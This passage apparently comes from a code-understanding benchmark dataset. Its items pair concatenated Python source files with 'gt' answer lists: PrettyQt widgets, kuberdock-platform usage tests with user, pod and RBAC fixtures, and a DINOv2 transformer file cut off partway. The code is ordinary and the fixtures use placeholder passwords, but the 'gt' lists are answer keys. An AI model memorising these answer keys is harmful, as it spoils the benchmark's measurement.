RegexLineEdit\nfrom .editors.regexinput import RegexInput\nfrom .editors.mappedcheckbox import MappedCheckBox\nfrom .editors.sliceedit import SliceEdit\nfrom .editors.rangeedit import RangeEdit\nfrom .logtextedit import LogTextEdit\nfrom .editors.enumflagwidget import EnumFlagWidget\nfrom .editors.flagselectionwidget import FlagSelectionWidget\nfrom .editors.stringornumberwidget import StringOrNumberWidget\nfrom .iconbrowser import IconBrowser\nfrom .objectbrowser import ObjectBrowser\nfrom .sidebarwidget import SidebarWidget\nfrom .editors.colorcombobox import ColorComboBox\nfrom .multicombobox import MultiComboBox\nfrom .editors.colorchooserbutton import ColorChooserButton\nfrom .editors.filechooserbutton import FileChooserButton\nfrom .editors.fontchooserbutton import FontChooserButton\nfrom .editors.inputandslider import InputAndSlider\nfrom .editors.spanslider import SpanSlider, SpanSliderWidget\nfrom .labeledslider import LabeledSlider\nfrom .waitingspinner import WaitingSpinner\nfrom .numfilterwidget import NumFilterWidget\nfrom .popupinfo import PopupInfo\nfrom .editors.selectionwidget import SelectionWidget\nfrom .codeeditor import CodeEditor\nfrom .astviewer import AstViewer\nfrom .roundprogressbar import RoundProgressBar\nfrom .subsequencecompleter import SubsequenceCompleter\nfrom .scrollareatocwidget import ScrollAreaTocWidget\n\n\nfrom .timeline import Timeline, VideoSample\nfrom .standardiconswidget import StandardIconsWidget\n\nfrom .itemviews.filetree import FileTree\nfrom .itemviews.filterheader import FilterHeader\n\n\n__all__ = [\n    \"AnnotatedScrollBar\",\n    \"PreviewScrollBar\",\n    \"SmoothScrollBar\",\n    \"IntLineEdit\",\n    \"FloatLineEdit\",\n    \"StringListEdit\",\n    \"UrlLineEdit\",\n    \"ImageViewer\",\n    \"CrossFadeWidget\",\n    \"FaderWidget\",\n    \"ElidedLabel\",\n    \"ListInput\",\n    \"BoolDictToolButton\",\n    \"OptionalWidget\",\n    \"MultiLineLayout\",\n    \"WidgetEditor\",\n    \"CollapsibleFrame\",\n    \"CommandPalette\",\n    \"ClickableLabel\",\n    \"OrientedTableView\",\n    \"QObjectPropertiesTableView\",\n    \"QObjectHierarchyTreeView\",\n    \"LogRecordTableView\",\n    \"FilterHeader\",\n    \"KeyCombinationEdit\",\n    \"SingleLineTextEdit\",\n    \"RegexLineEdit\",\n    \"RegexInput\",\n    \"MappedCheckBox\",\n    \"SliceEdit\",\n    \"RangeEdit\",\n    \"LogTextEdit\",\n    \"EnumFlagWidget\",\n    \"FlagSelectionWidget\",\n    \"StringOrNumberWidget\",\n    \"IconLabel\",\n    \"IconBrowser\",\n    \"IconWidget\",\n    \"BrushEdit\",\n    \"RectEdit\",\n    \"RectFEdit\",\n    \"PaletteEdit\",\n    \"CursorEdit\",\n    \"LocaleEdit\",\n    \"IconEdit\",\n    \"PointEdit\",\n    \"SizeEdit\",\n    \"RegionEdit\",\n    \"SizePolicyEdit\",\n    \"FlowLayout\",\n    \"BorderLayout\",\n    \"ObjectBrowser\",\n    \"SidebarWidget\",\n    \"EnumComboBox\",\n    \"ColorComboBox\",\n    \"MultiComboBox\",\n    \"ColorChooserButton\",\n    \"FileChooserButton\",\n    \"FontChooserButton\",\n    \"InputAndSlider\",\n    \"SpanSlider\",\n    \"NumFilterWidget\",\n    \"SpanSliderWidget\",\n    \"LabeledSlider\",\n    \"WaitingSpinner\",\n    \"RoundProgressBar\",\n    \"PopupInfo\",\n    \"SelectionWidget\",\n    \"CodeEditor\",\n    \"Timeline\",\n    \"AutoResizePlainTextEdit\",\n    \"AutoResizeTextEdit\",\n\n\n    \"AstViewer\",\n    \"VideoSample\",\n    \"StandardIconsWidget\",\n    \"SubsequenceCompleter\",\n    \"FileTree\",\n    \"ScrollAreaTocWidget\",\n]\n\n'PrettyQt/prettyqt/qthelp/helpfilterengine.py'\n:from __future__ import annotations\n\nfrom prettyqt import core, qthelp\n\n\nclass HelpFilterEngine(core.ObjectMixin):\n\n\n    def __init__(self, item: qthelp.QHelpFilterEngine):\n        self.item = item\n\n    def __getattr__(self, val):\n        return getattr(self.item, val)\n\n    def get_available_versions(self) -> list[core.VersionNumber]:\n        return [core.VersionNumber(i) for i in self.availableVersions()]\n\n    def get_filter_data(self, filter_name: str) -> qthelp.HelpFilterData:\n        return qthelp.HelpFilterData(self.filterData(filter_name))\n\n\nif __name__ == \"__main__\":\n    core_engine = qthelp.HelpEngineCore(\"test\")\n    engine = HelpFilterEngine(core_engine)\n    print(engine.get_filter_data(\"a\"))\n\n'PrettyQt/prettyqt/custom_widgets/standardiconswidget.py'\n:from __future__ import annotations\n\nfrom prettyqt import custom_widgets, widgets\n\n\nclass StandardIconsWidget(widgets.Widget):\n\n\n    def __init__(self, parent: widgets.QWidget | None = None):\n        super().__init__(parent)\n        layout = custom_widgets.MultiLineLayout(parent=self)\n        for k in widgets.style.STANDARD_PIXMAP:\n            icon_layout = widgets.HBoxLayout()\n            icon = widgets.Application.get_style_icon(k)\n            label = widgets.Label(pixmap=icon.pixmap(32, 32))\n            icon_layout.addWidget(label)\n            icon_layout.addWidget(widgets.LineEdit(k))\n            layout.addLayout(icon_layout)\n        self.set_layout(layout)\n        self.set_title(\"Standard Platform Icons\")\n        icon = widgets.Application.get_style_icon(\"titlebar_menu_button\")\n        self.set_icon(icon)\n\n\nif __name__ == \"__main__\":\n    app = widgets.app()\n    widget = StandardIconsWidget()\n    widget.show()\n    app.exec()\n",
        "gt": [
            "'PrettyQt/prettyqt/custom_widgets/standardiconswidget.py'",
            "'PrettyQt/prettyqt/custom_widgets/__init__.py'",
            "'PrettyQt/prettyqt/widgets/__init__.py'",
            "'PrettyQt/prettyqt/qthelp/helpcontentwidget.py'",
            "'PrettyQt/prettyqt/qthelp/__init__.py'",
            "'PrettyQt/prettyqt/qthelp/helpfilterengine.py'"
        ]
    },
    {
        "files": [
            "'kuberdock-platform/kubedock/api/tests/test_usage.py'",
            "'kuberdock-platform/kubedock/testutils/fixtures.py'",
            "'kuberdock-platform/kubedock/rbac/fixtures.py'"
        ],
        "content": "'kuberdock-platform/kubedock/api/tests/test_usage.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport unittest\nfrom kubedock.testutils.testcases import APITestCase\nfrom kubedock.testutils import fixtures\n\nfrom uuid import uuid4\nfrom time import sleep\nfrom datetime import datetime\nfrom ipaddress import ip_address\n\nfrom kubedock.validation import V\nfrom kubedock.usage.models import IpState, PersistentDiskState\nfrom kubedock.pods.models import Pod\n\nusage_per_user_schema = {\n    'pods_usage': {\n        'type': 'list', 'required': False,\n        'schema': {\n            'type': 'dict', 'required': True,\n            'schema': {\n                'id': {'type': 'string', 'required': True, 'empty': False},\n                'kube_id': {'type': 'integer', 'required': True},\n                'kubes': {'type': 'integer', 'required': True},\n                'name': {'type': 'string', 'required': True, 'empty': False},\n                'time': {\n                    'type': 'dict', 'required': True,\n                    'propertyschema': {'type': 'string', 'empty': False},\n                    'valueschema': {\n                        'type': 'list', 'required': True,\n                        'schema': {\n                            'type': 'dict', 'required': True,\n                            'schema': {\n                                'start': {'type': 'integer', 'required': True},\n                                'end': {'type': 'integer', 'required': True},\n                                'kubes': {'type': 'integer', 'required': True\n                                          }}}}}}}},\n    'pd_usage': {\n        'type': 'list', 'required': False,\n        'schema': {\n            'type': 'dict', 'required': True,\n            'schema': {\n                'start': {'type': 'integer', 'required': True},\n                'end': {'type': 'integer', 'required': True},\n                'pd_name': {'type': 'string', 'required': True,\n                            'empty': False},\n                'size': {'type': 'integer', 'required': True}}}},\n    'ip_usage': {\n        'type': 'list', 'required': False,\n        'schema': {\n            'type': 'dict', 'required': True,\n            'schema': {\n                'start': {'type': 'integer', 'required': True},\n                'end': {'type': 'integer', 'required': True},\n                'ip_address': {'type': 'string', 'required': True,\n                               'empty': False},\n                'pod_id': {'type': 'string', 'required': True,\n                           'empty': False}}}}}\n\n\nclass UsageResponseValidator(V):\n\n    get_schema = {\n        'status': {'type': 'string', 'required': True,\n                   'allowed': ['OK', 'error']},\n        'data': {'type': 'dict', 'required': True,\n                 'schema': usage_per_user_schema}\n    }\n    get_list_schema = {\n        'status': {'type': 'string', 'required': True,\n                   'allowed': ['OK', 'error']},\n        'data': {'type': 'dict', 'required': True,\n                 'propertyschema': {'type': 'string', 'empty': False},\n                 'valueschema': {'type': 'dict', 'required': True,\n                                 'schema': usage_per_user_schema}}}\n\n    def validate_get(self, data):\n        return self.validate(data, self.get_schema)\n\n    def validate_get_list(self, data):\n        return self.validate(data, self.get_list_schema)\n\n\nclass UsageTestCase(APITestCase):\n\n    url = '/usage'\n\n    def setUp(self):\n\n        self.another_user, _ = fixtures.user_fixtures(\n            username='another_user', email='another_user@test.test')\n        config = '{\"containers\":[{\"kubes\":1}]}'\n        self.ips = [(Pod(id=str(uuid4()), owner_id=self.user.id, name='pod1',\n                         kube_id=0, config=config).save(), u'192.168.43.132'),\n                    (Pod(id=str(uuid4()), owner_id=self.user.id, name='pod2',\n                         kube_id=0, config=config).save(), u'192.168.43.133'),\n                    (Pod(id=str(uuid4()), owner_id=self.another_user.id,\n                         name='pod3',\n                         kube_id=0, config=config).save(), u'192.168.43.134')]\n        for pod, ip in self.ips:\n            IpState.start(pod.id, int(ip_address(ip)))\n        self.pds = [(self.user.id, 'first_disk', 2),\n                    (self.user.id, 'second_disk', 16),\n                    (self.another_user.id, 'third_disk', 3)]\n        for user_id, name, size in self.pds:\n            PersistentDiskState.start(user_id, name, size)\n        sleep(1)\n        IpState.end(self.ips[0][0].id, int(ip_address(self.ips[0][1])))\n        PersistentDiskState.end(self.pds[0][0], self.pds[0][1])\n        self.stop_date = datetime.utcnow()\n\n\n    def test_get_by_user(self):\n        response = self.admin_open(self.item_url('FooBarUser'))\n        self.assertAPIError(response, 404, 'UserNotFound')\n\n        response = self.admin_open(self.item_url(self.user.username))\n        self.assert200(response)\n\n        validator = UsageResponseValidator()\n        if not validator.validate_get(response.json):\n            self.fail(validator.errors)\n\n\n        self.assertEqual(len(response.json['data']['ip_usage']), 2)\n\n        self.assertEqual(len(response.json['data']['pd_usage']), 2)\n\n\n    def test_get_all(self):\n        response = self.admin_open()\n        self.assert200(response)\n\n        validator = UsageResponseValidator()\n        if not validator.validate_get_list(response.json):\n            self.fail(validator.errors)\n\n        data = response.json['data']\n        self.assertEqual(len(data[self.user.username]['ip_usage']), 2)\n        self.assertEqual(len(data[self.another_user.username]['ip_usage']), 1)\n        self.assertEqual(len(data[self.user.username]['pd_usage']), 2)\n        self.assertEqual(len(data[self.another_user.username]['pd_usage']), 1)\n\n    def test_date_filter(self):\n        response = self.admin_open(\n            query_string={'date_from': self.stop_date.isoformat()})\n        data = response.json['data']\n        self.assertEqual(len(data[self.user.username]['ip_usage']), 1)\n        self.assertEqual(len(data[self.another_user.username]['ip_usage']), 1)\n        self.assertEqual(len(data[self.user.username]['pd_usage']), 1)\n        self.assertEqual(len(data[self.another_user.username]['pd_usage']), 1)\n\n    def test_date_error(self):\n        response = self.admin_open(\n            query_string={'date_from': '2016-01-00T00:00:00'})\n        self.assertAPIError(response, 400, 'APIError')\n\n\nif __name__ == '__main__':\n    unittest.main()\n\n'kuberdock-platform/kubedock/testutils/fixtures.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom random import randint\nfrom uuid import uuid4\nimport json\nimport socket\nimport struct\nimport responses\n\nfrom kubedock.billing.fixtures import add_kubes_and_packages\nfrom kubedock.core import db\nfrom kubedock.pods.models import PersistentDisk\nfrom kubedock.utils import randstr, NODE_STATUSES\nfrom kubedock.kapi.node import Node as K8SNode\nfrom kubedock.models import User, Pod\nfrom kubedock.billing.models import Kube\nfrom kubedock.nodes.models import Node\nfrom kubedock.notifications.fixtures import add_notifications\nfrom kubedock.predefined_apps.models import PredefinedApp\nfrom kubedock.rbac.fixtures import add_all_permissions\nfrom kubedock.rbac.models import Role\nfrom kubedock.system_settings.fixtures import add_system_settings\nfrom kubedock.static_pages.fixtures import generate_menu\nfrom kubedock.users.fixtures import add_users_and_roles\nfrom kubedock.utils import get_api_url\n\n\ndef initial_fixtures():\n\n\n    add_kubes_and_packages()\n\n    add_system_settings()\n\n    add_notifications()\n\n    add_all_permissions()\n\n    add_users_and_roles(randstr())\n\n    generate_menu()\n\n\n    db.engine.execute(\"SELECT setval('packages_id_seq', 1, false)\")\n\n\ndef user_fixtures(admin=False, active=True, **kwargs):\n    username = 'user_' + randstr(8)\n    password = randstr(10)\n    role_id = Role.filter_by(\n        rolename='User' if not admin else 'Admin').first().id\n    email = randstr(10) + '@test.test'\n\n    data = dict(username=username, password=password, active=active,\n                role_id=role_id, package_id=0, email=email)\n    user = User(**dict(data, **kwargs)).save()\n    return user, password\n\n\ndef admin_fixtures(**kwargs):\n    return user_fixtures(admin=True, **kwargs)\n\n\ndef pod(**kwargs):\n    if 'owner_id' not in kwargs and 'owner' not in kwargs:\n        kwargs['owner'], _ = user_fixtures()\n    if 'kube_id' not in kwargs and 'kube' not in kwargs:\n        kwargs['kube'] = Kube.get_default_kube()\n    if 'config' in kwargs and not isinstance(kwargs['config'], basestring):\n        kwargs['config'] = json.dumps(kwargs['config'])\n    namespace = str(uuid4())\n    kwargs.setdefault('id', namespace)\n    kwargs.setdefault('name', 'pod-' + randstr())\n    kwargs.setdefault('config', json.dumps({\n        'node': None,\n        'replicas': 1,\n        'secrets': [],\n        'namespace': namespace,\n        'restartPolicy': 'Never',\n        'volumes': [],\n        'sid': str(uuid4()),\n        'containers': [{\n            'kubes': 1,\n            'terminationMessagePath': None,\n            'name': 'curl' + randstr(),\n            'workingDir': '',\n            'image': 'appropriate/curl',\n            'args': ['curl', 'httpbin.org/get'],\n            'volumeMounts': [],\n            'sourceUrl': 'hub.docker.com/r/appropriate/curl',\n            'env': [{\n                'name': 'PATH',\n                'value': '/usr/local/sbin:/usr/local/bin:'\n                         '/usr/sbin:/usr/bin:/sbin:/bin'\n            }],\n            'ports': []}]}))\n    return Pod(**kwargs).save()\n\n\ndef node(hostname=None, ip=None, kube_id=None, owner=None):\n    if owner is None:\n        owner, _ = user_fixtures()\n    if kube_id is None:\n        kube_id = Kube.get_default_kube()\n    if ip is None:\n        ip = random_ip()\n    if hostname is None:\n        hostname = randstr()\n\n    return Node(\n        ip=ip, hostname=hostname, kube_id=kube_id.id,\n        state=NODE_STATUSES.pending)\n\n\ndef kube_type(**kwargs):\n    return Kube(**dict(\n        kwargs, name=randstr(), cpu=.25, memory=64, disk_space=1)).save()\n\n\ndef random_ip():\n    return unicode(socket.inet_ntoa(struct.pack('>I', randint(1, 0xffffffff))))\n\n\ndef persistent_disk(**kwargs):\n    if 'owner_id' not in kwargs and 'owner' not in kwargs:\n        kwargs['owner'], _ = user_fixtures()\n    return PersistentDisk(**kwargs).save()\n\n\ndef predefined_app(**kwargs):\n    db_app = PredefinedApp(name=kwargs.get('name', randstr()))\n    db.session.add(db_app)\n    for key, value in kwargs.items():\n        setattr(db_app, key, value)\n    db.session.commit()\n    return db_app\n\n\nclass K8SAPIStubs(object):\n    def __init__(self):\n        self.metadata = {}\n        self.nodes = {}\n\n    def node_info_update_in_k8s_api(self, hostname,\n                                    always_raise_conflict=False,\n                                    always_raise_failure=False):\n        def request_callback(request):\n            payload = json.loads(request.body)\n            version = int(payload['metadata']['resourceVersion'])\n\n            payload['metadata']['resourceVersion'] = str(version + 1)\n            payload['code'] = 200\n            self.nodes[hostname] = payload\n            return 200, {}, json.dumps(payload)\n\n        url = get_api_url('nodes', hostname, namespace=None)\n        if always_raise_conflict:\n            resp_body_on_conflict = \"\"\"{\n                \"apiVersion\": \"v1\",\n                \"code\": 409,\n                \"details\": {},\n                \"kind\": \"status\"\n            }\n            \"\"\"\n            responses.add(responses.PUT, url, status=409,\n                          body=resp_body_on_conflict)\n        elif always_raise_failure:\n            responses.add(responses.PUT, url, status=500,\n                          body=\"\")\n        else:\n            responses.add_callback(responses.PUT, url,\n                                   callback=request_callback)\n\n    def node_info_patch_in_k8s_api(self, hostname):\n\n\n        def request_callback(request):\n            payload = json.loads(request.body)\n            if 'metadata' in payload:\n\n                self.metadata[hostname] = payload['metadata']\n            return 200, {}, json.dumps(payload)\n\n        url = get_api_url('nodes', hostname, namespace=None)\n        responses.add_callback(responses.PATCH, url,\n                               callback=request_callback)\n\n    def node_info_in_k8s_api(self, hostname):\n\n\n        def request_callback(request):\n            metadata = {\n                \"resourceVersion\": 1,\n                \"annotations\": {\n                    K8SNode.FREE_PUBLIC_IP_COUNTER_FIELD: \"0\"\n                }\n            }\n\n            if hostname in self.nodes:\n                body = self.nodes[hostname]\n            else:\n                body = {\n                    \"apiVersion\": \"v1\",\n                    \"kind\": \"Node\",\n                    \"metadata\": metadata,\n                    \"labels\": {\n                        \"kuberdock-kube-type\": \"type_0\",\n                        \"kuberdock-node-hostname\": hostname\n                    },\n                    \"name\": hostname,\n                    \"status\": {},\n                }\n            return 200, {}, json.dumps(body)\n\n        url = get_api_url('nodes', hostname, namespace=None)\n        responses.add_callback(responses.GET, url, callback=request_callback)\n\n    def build_api_url(self, *args, **kwargs):\n        return get_api_url(*args, **kwargs)\n\n\nVALID_TEMPLATE1 = \"\"\"---\napiVersion: v1\nkind: ReplicationController\nkuberdock:\n  icon: http://icons.iconarchive.com/wordpress-icon.png\n  name: Wordpress app\n  packageID: 0\n  postDescription: Some \\$test %PUBLIC_ADDRESS%\n  preDescription: Some pre description\n  template_id: 1\n  appPackages:\n    - name: S\n      recommended: yes\n      goodFor: up to 100 users\n      publicIP: false\n      pods:\n        - name: $APP_NAME$\n          kubeType: 0\n          containers:\n            - name: mysql\n              kubes: 1\n            - name: wordpress\n              kubes: 2\n          persistentDisks:\n            - name: wordpress-persistent-storage\n              pdSize: 1\n            - name: mysql-persistent-storage$VAR_IN_NAME$\n              pdSize: $MYSQL_PD_SIZE|default:2|MySQL persistent disk size$\n    - name: M\n      goodFor: up to 100K visitors\n      publicIP: true\n      pods:\n        - name: $APP_NAME$\n          kubeType: 0\n          containers:\n            - name: mysql\n              kubes: 2\n            - name: wordpress\n              kubes: 4\n          persistentDisks:\n            - name: wordpress-persistent-storage\n              pdSize: 2\n            - name: mysql-persistent-storage$VAR_IN_NAME$\n              pdSize: 3\nmetadata:\n  name: $APP_NAME|default:WordPress|App name$\nspec:\n  template:\n    metadata:\n      labels:\n        name: $APP_NAME$\n    spec:\n      volumes:\n        - name: mysql-persistent-storage$VAR_IN_NAME|default:autogen|v$\n          persistentDisk:\n            pdName: wordpress_mysql_$PD_RAND|default:autogen|PD rand$\n        - name: wordpress-persistent-storage\n          persistentDisk:\n            pdName: wordpress_www_$PD_RAND$\n      containers:\n        -\n          env:\n            -\n              name: WORDPRESS_DB_NAME\n              value: wordpress\n            -\n              name: WORDPRESS_DB_USER\n              value: wordpress\n            -\n              name: WORDPRESS_DB_PASSWORD\n              value: paSd43\n            -\n              name: WORDPRESS_DB_HOST\n              value: 127.0.0.1\n            -\n              name: WP_ENV1\n              value: $WPENV1|default:1|test var 1 1$\n            -\n              name: WP_ENV2\n              value: $WPENV1$\n            -\n              name: WP_ENV3\n              value: $WPENV1$\n            -\n              name: WP_ENV4\n              value: $WPENV1|default:2|test var 1 2$\n          image: wordpress:4.6\n          name: wordpress\n          ports:\n            -\n              containerPort: 80\n              hostPort: 80\n              isPublic: True\n          volumeMounts:\n            - mountPath: /var/www/html\n              name: wordpress-persistent-storage\n\n        -\n          args: []\n\n          env:\n            -\n              name: MYSQL_ROOT_PASSWORD\n              value: wordpressdocker\n            -\n              name: MYSQL_DATABASE\n              value: wordpress\n            -\n              name: MYSQL_USER\n              value: wordpress\n            -\n              name: MYSQL_PASSWORD\n              value: paSd43\n            -\n              name: TEST_AUTOGEN1\n              value: $TESTAUTO1|default:autogen|test auto1$\n          image: mysql:5.7\n          name: mysql\n          ports:\n            -\n              containerPort: 3306\n          volumeMounts:\n            - mountPath: /var/lib/mysql\n              name: mysql-persistent-storage$VAR_IN_NAME$\n\n      restartPolicy: Always\n\"\"\"\n\n\nsample_certificate = {\n    'cert': open(\n        'kubedock/testutils/certificates/wildcard.example.com.crt').read(),\n    'key': open(\n        'kubedock/testutils/certificates/wildcard.example.com.key').read(),\n}\n\n'kuberdock-platform/kubedock/rbac/fixtures.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom kubedock.core import db\nfrom .models import Resource, Role, Permission\n\nROLES = (\n\n    (\"Admin\", False),\n    (\"User\", False),\n    (\"LimitedUser\", False),\n    (\"TrialUser\", False),\n)\n\nresources = {\n    'users': ('create', 'get', 'edit', 'delete', 'auth_by_another'),\n    'nodes': ('create', 'get', 'edit', 'delete', 'redeploy'),\n    'pods': ('own', 'create', 'get', 'edit', 'delete', 'create_non_owned',\n             'get_non_owned', 'edit_non_owned', 'delete_non_owned', 'dump'),\n    'persistent_volumes': ('own', 'create', 'get', 'edit', 'delete',\n                           'create_non_owned', 'get_non_owned',\n                           'edit_non_owned', 'delete_non_owned'),\n    'yaml_pods': ('create', 'create_non_owned'),\n    'ippool': ('create', 'get', 'edit', 'delete', 'view'),\n    'notifications': ('create', 'get', 'edit', 'delete'),\n    'system_settings': ('read', 'read_private', 'write', 'delete'),\n    'images': ('get', 'isalive'),\n    'predefined_apps': ('create', 'get', 'edit', 'delete'),\n    'pricing': ('create', 'get', 'edit', 'delete', 'get_own'),\n    'timezone': ('get',),\n    'domains': ('create', 'get', 'edit', 'delete'),\n    'allowed-ports': ('get', 'create', 'delete'),\n    'restricted-ports': ('get', 'create', 'delete'),\n}\n\npermissions_base = {\n    (resource, action): False\n    for resource, actions in resources.iteritems() for action in actions\n    }\npermissions = {\n    'Admin': dict(permissions_base, **{\n        ('users', 'create'): True,\n        ('users', 'get'): True,\n        ('users', 'edit'): True,\n        ('users', 'delete'): True,\n        ('users', 'auth_by_another'): True,\n        ('nodes', 'create'): True,\n        ('nodes', 'get'): True,\n        ('nodes', 'edit'): True,\n        ('nodes', 'delete'): True,\n        ('nodes', 'redeploy'): True,\n        ('ippool', 'create'): True,\n        ('ippool', 'get'): True,\n        ('ippool', 'edit'): True,\n        ('ippool', 'delete'): True,\n        ('ippool', 'view'): True,\n        ('notifications', 'create'): True,\n        ('notifications', 'get'): True,\n        ('notifications', 'edit'): True,\n        ('notifications', 'delete'): True,\n        ('system_settings', 'read'): True,\n        ('system_settings', 'read_private'): True,\n        ('system_settings', 'write'): True,\n        ('system_settings', 'delete'): True,\n        ('images', 'get'): True,\n        ('images', 'isalive'): True,\n        ('pods', 'create_non_owned'): True,\n        ('pods', 'get_non_owned'): True,\n        ('pods', 'edit_non_owned'): True,\n        ('pods', 'delete_non_owned'): True,\n        ('pods', 'dump'): True,\n        ('persistent_volumes', 'create_non_owned'): True,\n        ('persistent_volumes', 'get_non_owned'): True,\n        ('persistent_volumes', 'edit_non_owned'): True,\n        ('persistent_volumes', 'delete_non_owned'): True,\n        ('predefined_apps', 'create'): True,\n        ('predefined_apps', 'get'): True,\n        ('predefined_apps', 'edit'): True,\n        ('predefined_apps', 'delete'): True,\n        ('pricing', 'get'): True,\n        ('pricing', 'get_own'): True,\n        ('pricing', 'edit'): True,\n        ('pricing', 'create'): True,\n        ('pricing', 'delete'): True,\n        ('timezone', 'get'): True,\n        ('domains', 'create'): True,\n        ('domains', 'get'): True,\n        ('domains', 'edit'): True,\n        ('domains', 'delete'): True,\n        ('yaml_pods', 'create_non_owned'): True,\n        ('allowed-ports', 'get'): True,\n        ('allowed-ports', 'create'): True,\n        ('allowed-ports', 'delete'): True,\n        ('restricted-ports', 'get'): True,\n        ('restricted-ports', 'create'): True,\n        ('restricted-ports', 'delete'): True,\n    }),\n    'User': dict(permissions_base, **{\n        ('pods', 'own'): True,\n        ('pods', 'create'): True,\n        ('pods', 'get'): True,\n        ('pods', 'edit'): True,\n        ('pods', 'delete'): True,\n        ('persistent_volumes', 'own'): True,\n        ('persistent_volumes', 'create'): True,\n        ('persistent_volumes', 'get'): True,\n        ('persistent_volumes', 'edit'): True,\n        ('persistent_volumes', 'delete'): True,\n        ('predefined_apps', 'get'): True,\n        ('yaml_pods', 'create'): True,\n        ('system_settings', 'read'): True,\n        ('images', 'get'): True,\n        ('images', 'isalive'): True,\n        ('pricing', 'get_own'): True,\n        ('timezone', 'get'): True,\n        ('domains', 'get'): True,\n    }),\n}\npermissions['LimitedUser'] = dict(permissions['User'], **{\n    ('pods', 'create'): False,\n    ('persistent_volumes', 'create'): False,\n})\npermissions['TrialUser'] = dict(permissions['User'], **{\n\n})\n\nRESOURCES = resources.keys()\nPERMISSIONS = [\n    (resource, role, action, allowed)\n    for role, perms in permissions.iteritems()\n    for (resource, action), allowed in perms.iteritems()\n    ]\n\n\ndef add_roles(roles=()):\n    for r in roles:\n        if not Role.filter(Role.rolename == r[0]).first():\n            role = Role.create(rolename=r[0], internal=r[1])\n            role.save()\n\n\ndef delete_roles(roles=()):\n\n    for role_name in roles:\n        role = Role.filter(Role.rolename == role_name).first()\n        if role:\n            Permission.filter(Permission.role == role).delete()\n            db.session.commit()\n            role.delete()\n\n\ndef add_resources(resources=()):\n    for res in resources:\n        if not Resource.filter(Resource.name == res).first():\n            resource = Resource.create(name=res)\n            resource.save()\n\n\ndef delete_resources(resources=()):\n\n    for resource_name in resources:\n        resource = Resource.filter(Resource.name == resource_name).first()\n        if resource:\n            Permission.filter(Permission.resource == resource).delete()\n            db.session.commit()\n            resource.delete()\n\n\ndef _add_permissions(permissions=()):\n    for res, role, perm, allow in permissions:\n        resource = Resource.query.filter_by(name=res).first()\n        role = Role.query.filter_by(rolename=role).first()\n        if role and resource:\n            exist = Permission.filter(Permission.role == role). \\\n                filter(Permission.resource == resource). \\\n                filter(Permission.allow == allow). \\\n                filter(Permission.name == perm).first()\n            if not exist:\n                permission = Permission.create(\n                    resource_id=resource.id,\n                    role_id=role.id, name=perm, allow=allow)\n                permission.save()\n\n\ndef _delete_permissions(permissions=()):\n    for res, role, perm, allow in permissions:\n        resource = Resource.query.filter_by(name=res).first()\n        role = Role.query.filter_by(rolename=role).first()\n        if role and resource:\n            permission = Permission.filter(Permission.role == role). \\\n                filter(Permission.resource == resource). \\\n                filter(Permission.allow == allow). \\\n                filter(Permission.name == perm).first()\n            if permission:\n                permission.delete()\n\n\ndef add_permissions(roles=None, resources=None, permissions=None):\n    if roles:\n        add_roles(roles)\n    if resources:\n        add_resources(resources)\n    if permissions:\n        _add_permissions(permissions)\n\n\ndef change_permissions(new_permissions):\n\n    for res, role, perm, allow in new_permissions:\n        res = Permission.query.join(Role).join(Resource) \\\n            .filter(Permission.name == perm, Role.rolename == role,\n                    Resource.id == Permission.resource_id,\n                    Role.id == Permission.role_id,\n                    Resource.name == res)\\\n            .update({'allow': allow}, synchronize_session=False)\n        if res == 0:\n            db.session.rollback()\n            raise KeyError('Permission not found: %s'\n                           % [res, role, perm, allow])\n\n    db.session.commit()\n\n\ndef add_all_permissions():\n    return add_permissions(ROLES, RESOURCES, PERMISSIONS)\n\n\nif __name__ == '__main__':\n    add_permissions()\n",
        "gt": [
            "'kuberdock-platform/kubedock/rbac/fixtures.py'",
            "'kuberdock-platform/kubedock/testutils/fixtures.py'",
            "'kuberdock-platform/kubedock/api/tests/test_usage.py'"
        ]
    },
    {
        "files": [
            "'MuSc/models/backbone/dino_vision_transformer.py'",
            "'MuSc/models/backbone/dinov2/__init__.py'",
            "'MuSc/models/backbone/dinov2/mlp.py'",
            "'MuSc/models/backbone/_backbones.py'"
        ],
        "content": "'MuSc/models/backbone/dino_vision_transformer.py'\n:\n\n\n\n\n\n\n\n\n\nfrom functools import partial\nimport math\nimport logging\nfrom typing import Sequence, Tuple, Union, Callable\n\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint\nfrom torch.nn.init import trunc_normal_\n\nfrom models.backbone.dinov2 import Mlp, PatchEmbed, SwiGLUFFNFused, MemEffAttention, NestedTensorBlock as Block\n\n\nlogger = logging.getLogger(\"dinov2\")\n\n\ndef named_apply(fn: Callable, module: nn.Module, name=\"\", depth_first=True, include_root=False) -> nn.Module:\n    if not depth_first and include_root:\n        fn(module=module, name=name)\n    for child_name, child_module in module.named_children():\n        child_name = \".\".join((name, child_name)) if name else child_name\n        named_apply(fn=fn, module=child_module, name=child_name, depth_first=depth_first, include_root=True)\n    if depth_first and include_root:\n        fn(module=module, name=name)\n    return module\n\n\nclass BlockChunk(nn.ModuleList):\n    def forward(self, x):\n        for b in self:\n            x = b(x)\n        return x\n\n\nclass DinoVisionTransformer(nn.Module):\n    def __init__(\n        self,\n        img_size=224,\n        patch_size=16,\n        in_chans=3,\n        embed_dim=768,\n        depth=12,\n        num_heads=12,\n        mlp_ratio=4.0,\n        qkv_bias=True,\n        ffn_bias=True,\n        proj_bias=True,\n        drop_path_rate=0.0,\n        drop_path_uniform=False,\n        init_values=None,\n        embed_layer=PatchEmbed,\n        act_layer=nn.GELU,\n        block_fn=Block,\n        ffn_layer=\"mlp\",\n        block_chunks=1,\n    ):\n        \"\"\"\n        Args:\n            img_size (int, tuple): input image size\n            patch_size (int, tuple): patch size\n            in_chans (int): number of input channels\n            embed_dim (int): embedding dimension\n            depth (int): depth of transformer\n            num_heads (int): number of attention heads\n            mlp_ratio (int): ratio of mlp hidden dim to embedding dim\n            qkv_bias (bool): enable bias for qkv if True\n            proj_bias (bool): enable bias for proj in attn if True\n            ffn_bias (bool): enable bias for ffn if True\n            drop_path_rate (float): stochastic depth rate\n            drop_path_uniform (bool): apply uniform drop rate across blocks\n            weight_init (str): weight init scheme\n            init_values (float): layer-scale init values\n            embed_layer (nn.Module): patch embedding layer\n            act_layer (nn.Module): MLP activation layer\n            block_fn (nn.Module): transformer block class\n            ffn_layer (str): 